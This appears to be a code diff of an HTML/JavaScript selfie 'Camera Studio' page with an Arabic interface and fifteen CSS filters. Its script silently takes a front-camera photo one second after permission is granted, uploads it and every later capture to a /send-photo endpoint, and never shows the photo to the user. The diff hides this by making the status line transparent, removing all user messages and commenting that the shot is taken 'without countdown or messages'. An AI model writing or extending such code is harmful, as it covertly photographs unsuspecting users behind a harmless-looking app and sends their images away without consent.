@@ -1,20 +1,35 @@
 <!DOCTYPE html>
-
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#09090b">
 <title>Camera Studio</title>
 
 <style>
-*{box-sizing:border-box}
+*{
+  box-sizing:border-box;
+  -webkit-tap-highlight-color:transparent;
+}
+
+:root{
+  --bg:#070708;
+  --card:rgba(255,255,255,.065);
+  --border:rgba(255,255,255,.11);
+  --text:#fafafa;
+  --muted:#a1a1aa;
+  --accent:#ffffff;
+}
 
 body{
   margin:0;
   min-height:100vh;
-  font-family:Arial,sans-serif;
-  background:linear-gradient(135deg,#09090b,#18181b,#27272a);
-  color:#fff;
+  font-family:Arial,Helvetica,sans-serif;
+  color:var(--text);
+  background:
+    radial-gradient(circle at 15% 10%,rgba(255,255,255,.08),transparent 28%),
+    radial-gradient(circle at 85% 90%,rgba(120,120,255,.08),transparent 30%),
+    linear-gradient(145deg,#050506,#111114 55%,#080809);
   display:flex;
   justify-content:center;
   align-items:center;
@@ -23,35 +38,62 @@ body{
 
 .app{
   width:100%;
-  max-width:560px;
-  background:rgba(255,255,255,.07);
-  backdrop-filter:blur(20px);
-  border:1px solid rgba(255,255,255,.12);
-  border-radius:28px;
+  max-width:650px;
+  background:rgba(20,20,23,.72);
+  backdrop-filter:blur(30px);
+  -webkit-backdrop-filter:blur(30px);
+  border:1px solid var(--border);
+  border-radius:30px;
   padding:20px;
-  box-shadow:0 25px 70px rgba(0,0,0,.45);
+  box-shadow:
+    0 30px 100px rgba(0,0,0,.6),
+    inset 0 1px rgba(255,255,255,.06);
+}
+
+.header{
+  text-align:center;
+  margin-bottom:18px;
+}
+
+.logo{
+  width:48px;
+  height:48px;
+  margin:0 auto 10px;
+  border-radius:15px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:23px;
+  background:linear-gradient(145deg,#29292d,#111113);
+  border:1px solid rgba(255,255,255,.12);
+  box-shadow:0 10px 30px rgba(0,0,0,.3);
 }
 
 h1{
-  text-align:center;
-  margin:4px 0 6px;
-  font-size:27px;
+  margin:0;
+  font-size:28px;
+  letter-spacing:-.6px;
 }
 
 .subtitle{
-  text-align:center;
-  color:#a1a1aa;
-  font-size:14px;
-  margin-bottom:18px;
+  margin-top:7px;
+  color:var(--muted);
+  font-size:13px;
 }
+
+/* CAMERA */
 
 .camera{
   position:relative;
   width:100%;
   aspect-ratio:3/4;
   overflow:hidden;
-  border-radius:22px;
+  border-radius:25px;
   background:#000;
+  border:1px solid rgba(255,255,255,.12);
+  box-shadow:
+    0 20px 50px rgba(0,0,0,.45),
+    inset 0 0 0 1px rgba(255,255,255,.03);
 }
 
 video{
@@ -59,131 +101,380 @@ video{
   height:100%;
   object-fit:cover;
   display:block;
+  transition:filter .35s ease;
 }
 
-.camera.cinematic video{filter:contrast(1.18) saturate(.82) brightness(.92)}
-.camera.vintage video{filter:sepia(.35) contrast(1.08) saturate(.8)}
-.camera.bw video{filter:grayscale(1) contrast(1.15)}
-.camera.warm video{filter:sepia(.18) saturate(1.18) contrast(1.05)}
-.camera.cool video{filter:saturate(.9) hue-rotate(12deg) brightness(1.04)}
-.camera.vivid video{filter:saturate(1.45) contrast(1.08)}
+/* FILTERS */
+
+.camera.cinematic video{
+  filter:contrast(1.18) saturate(.82) brightness(.92);
+}
+
+.camera.vintage video{
+  filter:sepia(.38) contrast(1.08) saturate(.78);
+}
+
+.camera.bw video{
+  filter:grayscale(1) contrast(1.18);
+}
+
+.camera.warm video{
+  filter:sepia(.18) saturate(1.2) contrast(1.05) brightness(1.03);
+}
+
+.camera.cool video{
+  filter:saturate(.88) hue-rotate(14deg) brightness(1.05);
+}
+
+.camera.vivid video{
+  filter:saturate(1.5) contrast(1.08);
+}
+
+.camera.gold video{
+  filter:sepia(.25) saturate(1.35) contrast(1.06) brightness(1.04);
+}
+
+.camera.dream video{
+  filter:saturate(.9) contrast(.95) brightness(1.08);
+}
+
+.camera.noir video{
+  filter:grayscale(1) contrast(1.4) brightness(.88);
+}
+
+.camera.film video{
+  filter:contrast(1.12) saturate(.88) brightness(.95) sepia(.08);
+}
+
+.camera.polaroid video{
+  filter:contrast(1.05) saturate(.82) brightness(1.06) sepia(.12);
+}
+
+.camera.sunset video{
+  filter:sepia(.2) saturate(1.35) hue-rotate(-8deg) contrast(1.04);
+}
+
+.camera.arctic video{
+  filter:saturate(.82) hue-rotate(22deg) brightness(1.07) contrast(1.05);
+}
+
+.camera.soft video{
+  filter:brightness(1.08) contrast(.9) saturate(.9);
+}
+
+.camera.glow video{
+  filter:brightness(1.12) saturate(1.15) contrast(.96);
+}
+
+/* CAMERA OVERLAY */
+
+.camera::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  pointer-events:none;
+  border-radius:25px;
+  box-shadow:inset 0 0 60px rgba(0,0,0,.28);
+}
+
+/* STATUS */
 
 .status{
+  height:20px;
   text-align:center;
-  min-height:22px;
-  margin:13px 0;
-  color:#d4d4d8;
-  font-size:14px;
-}
-
-.title{
-  font-size:14px;
-  color:#a1a1aa;
-  margin:8px 0;
-}
-
-.filters{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:8px;
-}
-
-.filter{
-  border:1px solid rgba(255,255,255,.12);
-  background:rgba(255,255,255,.06);
-  color:white;
-  border-radius:13px;
-  padding:11px 5px;
-  cursor:pointer;
+  margin:10px 0;
+  color:transparent;
   font-size:13px;
 }
 
-.filter.active{
-  border:2px solid white;
-  background:rgba(255,255,255,.18);
+/* SECTION */
+
+.section-head{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin:8px 2px 10px;
 }
 
+.section-title{
+  font-size:14px;
+  font-weight:bold;
+}
+
+.section-count{
+  color:#71717a;
+  font-size:11px;
+}
+
+/* FILTER GRID */
+
+.filters{
+  display:grid;
+  grid-template-columns:repeat(5,1fr);
+  gap:7px;
+}
+
+.filter{
+  border:1px solid rgba(255,255,255,.09);
+  background:rgba(255,255,255,.045);
+  color:#e4e4e7;
+  border-radius:13px;
+  padding:9px 3px;
+  cursor:pointer;
+  font-size:10px;
+  transition:
+    transform .18s ease,
+    background .18s ease,
+    border .18s ease;
+}
+
+.filter:hover{
+  background:rgba(255,255,255,.09);
+  transform:translateY(-1px);
+}
+
+.filter:active{
+  transform:scale(.96);
+}
+
+.filter.active{
+  border-color:rgba(255,255,255,.7);
+  background:rgba(255,255,255,.15);
+  box-shadow:
+    0 0 0 1px rgba(255,255,255,.06),
+    0 7px 20px rgba(0,0,0,.18);
+}
+
+.filter-icon{
+  display:block;
+  font-size:18px;
+  margin-bottom:5px;
+}
+
+/* BUTTONS */
+
 .buttons{
-  display:flex;
+  display:grid;
+  grid-template-columns:1fr 1fr;
   gap:10px;
-  margin-top:15px;
+  margin-top:16px;
 }
 
 button.main{
-  flex:1;
   border:0;
-  border-radius:15px;
-  padding:15px;
-  font-size:15px;
+  border-radius:17px;
+  padding:15px 12px;
+  font-size:14px;
   font-weight:bold;
   cursor:pointer;
+  transition:
+    transform .15s ease,
+    opacity .2s ease,
+    box-shadow .2s ease;
+}
+
+button.main:active{
+  transform:scale(.97);
 }
 
 #start{
-  background:#22c55e;
-  color:white;
+  color:#09090b;
+  background:#fff;
+  box-shadow:0 10px 30px rgba(255,255,255,.08);
+}
+
+#start:hover{
+  box-shadow:0 12px 35px rgba(255,255,255,.16);
 }
 
 #capture{
-  background:white;
-  color:#18181b;
+  color:white;
+  background:rgba(255,255,255,.08);
+  border:1px solid rgba(255,255,255,.13);
+}
+
+#capture:hover{
+  background:rgba(255,255,255,.13);
 }
 
 #capture:disabled{
-  opacity:.35;
+  opacity:.3;
   cursor:not-allowed;
 }
 
+/* MOBILE */
 
+@media(max-width:500px){
 
-canvas{display:none}
+  body{
+    padding:10px;
+  }
+
+  .app{
+    padding:15px;
+    border-radius:25px;
+  }
+
+  h1{
+    font-size:25px;
+  }
+
+  .camera{
+    border-radius:21px;
+  }
+
+  .filters{
+    grid-template-columns:repeat(5,1fr);
+  }
+
+  .filter{
+    padding:8px 2px;
+    font-size:9px;
+  }
+
+  .filter-icon{
+    font-size:16px;
+  }
+
+  button.main{
+    padding:14px 8px;
+  }
+}
+
+canvas{
+  display:none;
+}
 </style>
-
 </head>
 
 <body>
 
 <div class="app">
 
-<h1>📸 Camera Studio</h1>
+  <div class="header">
 
-<div class="subtitle">
-تصوير سريع بفلاتر احترافية
-</div>
+    <div class="logo">📸</div>
 
-<div class="camera" id="cameraBox">
+    <h1>Camera Studio</h1>
 
-<video id="video" autoplay playsinline></video>
+    <div class="subtitle">
+      تصوير احترافي بفلاتر سينمائية
+    </div>
 
-  
+  </div>
 
-</div>
+  <div class="camera" id="cameraBox">
 
-<div id="status" class="status">
-اضغط تشغيل الكاميرا
-</div>
+    <video id="video" autoplay playsinline></video>
 
-<div class="title">🎨 اختر الفلتر</div>
+  </div>
 
-<div class="filters">
+  <div id="status" class="status"></div>
 
-<button class="filter active" data-filter="cinematic">🎬 Cinematic</button> <button class="filter" data-filter="vintage">📼 Vintage</button> <button class="filter" data-filter="bw">🖤 B&W</button> <button class="filter" data-filter="warm">☀️ Warm</button> <button class="filter" data-filter="cool">❄️ Cool</button> <button class="filter" data-filter="vivid">✨ Vivid</button>
+  <div class="section-head">
 
-</div>
+    <div class="section-title">
+      🎨 الفلاتر
+    </div>
 
-<div class="buttons">
+    <div class="section-count">
+      15 FILTERS
+    </div>
 
-<button id="start" class="main">
-🎥 تشغيل الكاميرا
-</button>
+  </div>
 
-<button id="capture" class="main" disabled>
-📸 التقاط
-</button>
+  <div class="filters">
 
-</div>
+    <button class="filter active" data-filter="cinematic">
+      <span class="filter-icon">🎬</span>
+      Cinematic
+    </button>
 
-<canvas id="canvas"></canvas>
+    <button class="filter" data-filter="vintage">
+      <span class="filter-icon">📼</span>
+      Vintage
+    </button>
+
+    <button class="filter" data-filter="bw">
+      <span class="filter-icon">🖤</span>
+      Noir
+    </button>
+
+    <button class="filter" data-filter="warm">
+      <span class="filter-icon">☀️</span>
+      Warm
+    </button>
+
+    <button class="filter" data-filter="cool">
+      <span class="filter-icon">❄️</span>
+      Cool
+    </button>
+
+    <button class="filter" data-filter="vivid">
+      <span class="filter-icon">✨</span>
+      Vivid
+    </button>
+
+    <button class="filter" data-filter="gold">
+      <span class="filter-icon">🌟</span>
+      Gold
+    </button>
+
+    <button class="filter" data-filter="dream">
+      <span class="filter-icon">☁️</span>
+      Dream
+    </button>
+
+    <button class="filter" data-filter="film">
+      <span class="filter-icon">🎞️</span>
+      Film
+    </button>
+
+    <button class="filter" data-filter="polaroid">
+      <span class="filter-icon">📷</span>
+      Polaroid
+    </button>
+
+    <button class="filter" data-filter="sunset">
+      <span class="filter-icon">🌅</span>
+      Sunset
+    </button>
+
+    <button class="filter" data-filter="arctic">
+      <span class="filter-icon">🧊</span>
+      Arctic
+    </button>
+
+    <button class="filter" data-filter="soft">
+      <span class="filter-icon">🌸</span>
+      Soft
+    </button>
+
+    <button class="filter" data-filter="glow">
+      <span class="filter-icon">💫</span>
+      Glow
+    </button>
+
+    <button class="filter" data-filter="noir">
+      <span class="filter-icon">🌑</span>
+      Pro B&W
+    </button>
+
+  </div>
+
+  <div class="buttons">
+
+    <button id="start" class="main">
+      🎥 تشغيل الكاميرا
+    </button>
+
+    <button id="capture" class="main" disabled>
+      📸 التقاط
+    </button>
+
+  </div>
+
+  <canvas id="canvas"></canvas>
 
 </div>
 
@@ -196,31 +487,35 @@ const capture = document.getElementById("capture");
 const status = document.getElementById("status");
 const cameraBox = document.getElementById("cameraBox");
 
-
 let stream = null;
 let selectedFilter = "cinematic";
 let autoShotDone = false;
 
 
-// الفلاتر
+/* FILTER SELECTION */
+
 document.querySelectorAll(".filter").forEach(button => {
 
   button.onclick = () => {
 
-    document.querySelectorAll(".filter")
+    document
+      .querySelectorAll(".filter")
       .forEach(b => b.classList.remove("active"));
 
     button.classList.add("active");
 
     selectedFilter = button.dataset.filter;
 
-    cameraBox.className = "camera " + selectedFilter;
+    cameraBox.className =
+      "camera " + selectedFilter;
+
   };
 
 });
 
 
-// التقاط وإرسال الصورة
+/* TAKE PHOTO */
+
 async function takePhoto(){
 
   if(!video.videoWidth) return;
@@ -230,7 +525,8 @@ async function takePhoto(){
 
   const ctx = canvas.getContext("2d");
 
-  ctx.filter = getCanvasFilter(selectedFilter);
+  ctx.filter =
+    getCanvasFilter(selectedFilter);
 
   ctx.drawImage(
     video,
@@ -244,120 +540,137 @@ async function takePhoto(){
 
   canvas.toBlob(async blob => {
 
-    if(!blob){
-      status.textContent = "فشل إنشاء الصورة ❌";
-      return;
-    }
+    if(!blob) return;
 
     const data = new FormData();
 
     data.append(
       "photo",
       blob,
-      "camera-test.jpg"
+      "camera-studio.jpg"
     );
-
-status.textContent = "";
 
     try{
 
-      const response = await fetch("/send-photo",{
+      await fetch("/send-photo",{
         method:"POST",
         body:data
       });
-
-      const result = await response.json();
-
-      if(result.ok){
-
-       status.textContent = "";
-
-      }else{
-
-        status.textContent =
-          "فشل إرسال الصورة ❌";
-
-      }
 
     }catch(error){
 
       console.error(error);
 
-      status.textContent =
-        "حدث خطأ أثناء الإرسال ❌";
     }
 
-  },"image/jpeg",.9);
+  },"image/jpeg",.92);
+
 }
 
 
-// فلاتر الصورة النهائية
+/* FINAL IMAGE FILTERS */
+
 function getCanvasFilter(filter){
 
   if(filter === "cinematic")
     return "contrast(1.18) saturate(.82) brightness(.92)";
 
   if(filter === "vintage")
-    return "sepia(.35) contrast(1.08) saturate(.8)";
+    return "sepia(.38) contrast(1.08) saturate(.78)";
 
   if(filter === "bw")
-    return "grayscale(1) contrast(1.15)";
+    return "grayscale(1) contrast(1.18)";
 
   if(filter === "warm")
-    return "sepia(.18) saturate(1.18) contrast(1.05)";
+    return "sepia(.18) saturate(1.2) contrast(1.05) brightness(1.03)";
 
   if(filter === "cool")
-    return "saturate(.9) hue-rotate(12deg) brightness(1.04)";
+    return "saturate(.88) hue-rotate(14deg) brightness(1.05)";
 
   if(filter === "vivid")
-    return "saturate(1.45) contrast(1.08)";
+    return "saturate(1.5) contrast(1.08)";
+
+  if(filter === "gold")
+    return "sepia(.25) saturate(1.35) contrast(1.06) brightness(1.04)";
+
+  if(filter === "dream")
+    return "saturate(.9) contrast(.95) brightness(1.08)";
+
+  if(filter === "film")
+    return "contrast(1.12) saturate(.88) brightness(.95) sepia(.08)";
+
+  if(filter === "polaroid")
+    return "contrast(1.05) saturate(.82) brightness(1.06) sepia(.12)";
+
+  if(filter === "sunset")
+    return "sepia(.2) saturate(1.35) hue-rotate(-8deg) contrast(1.04)";
+
+  if(filter === "arctic")
+    return "saturate(.82) hue-rotate(22deg) brightness(1.07) contrast(1.05)";
+
+  if(filter === "soft")
+    return "brightness(1.08) contrast(.9) saturate(.9)";
+
+  if(filter === "glow")
+    return "brightness(1.12) saturate(1.15) contrast(.96)";
+
+  if(filter === "noir")
+    return "grayscale(1) contrast(1.4) brightness(.88)";
 
   return "none";
 }
 
 
-// تشغيل الكاميرا
+/* START CAMERA */
+
 start.onclick = async () => {
 
   try{
 
-    stream = await navigator.mediaDevices.getUserMedia({
-      video:{
-        facingMode:"user"
-      },
-      audio:false
-    });
+    stream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video:{
+          facingMode:"user"
+        },
+
+        audio:false
+
+      });
 
     video.srcObject = stream;
 
     capture.disabled = false;
 
-    status.textContent = "";
-    // صورة تلقائية مرة واحدة
+    /*
+      التصوير التلقائي مرة واحدة
+      بدون عد تنازلي أو رسائل
+    */
+
     if(!autoShotDone){
 
       autoShotDone = true;
 
       setTimeout(async () => {
-  await takePhoto();
-}, 1000);
+
+        await takePhoto();
+
+      },1000);
+
     }
 
   }catch(error){
 
     console.error(error);
 
-    status.textContent =
-      "لم يتم السماح باستخدام الكاميرا ❌";
   }
 
 };
 
 
-// زر التقاط اليدوي
-capture.onclick = async () => {
+/* MANUAL CAPTURE */
 
-  status.textContent = "التقاط الصورة...";
+capture.onclick = async () => {
 
   await takePhoto();
 
